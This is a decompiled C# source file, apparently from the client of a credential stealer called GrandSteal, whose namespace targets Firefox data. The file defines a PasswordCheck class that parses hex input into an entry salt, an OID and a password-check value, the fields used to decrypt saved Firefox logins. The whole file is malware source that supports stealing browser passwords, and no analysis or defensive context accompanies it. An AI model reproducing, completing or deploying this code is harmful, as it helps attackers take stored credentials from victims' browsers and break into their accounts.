using System;
using System.Globalization;

namespace GrandSteal.Client.Data.Firefox
{
	// Token: 0x02000018 RID: 24
	public class PasswordCheck
	{
		// Token: 0x1700003A RID: 58
		// (get) Token: 0x060000A2 RID: 162 RVA: 0x0000257B File Offset: 0x0000077B
		// (set) Token: 0x060000A3 RID: 163 RVA: 0x00002583 File Offset: 0x00000783
		public string EntrySalt { get; private set; }

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x060000A4 RID: 164 RVA: 0x0000258C File Offset: 0x0000078C
		// (set) Token: 0x060000A5 RID: 165 RVA: 0x00002594 File Offset: 0x00000794
		public string OID { get; private set; }

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x060000A6 RID: 166 RVA: 0x0000259D File Offset: 0x0000079D
		// (set) Token: 0x060000A7 RID: 167 RVA: 0x000025A5 File Offset: 0x000007A5
		public string Passwordcheck { get; private set; }

		// Token: 0x060000A8 RID: 168 RVA: 0x00005038 File Offset: 0x00003238
		public PasswordCheck(string DataToParse)
		{
			int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
			this.EntrySalt = DataToParse.Substring(6, num);
			int num2 = DataToParse.Length - (6 + num + 36);
			this.OID = DataToParse.Substring(6 + num + 36, num2);
			this.Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
		}
	}
}
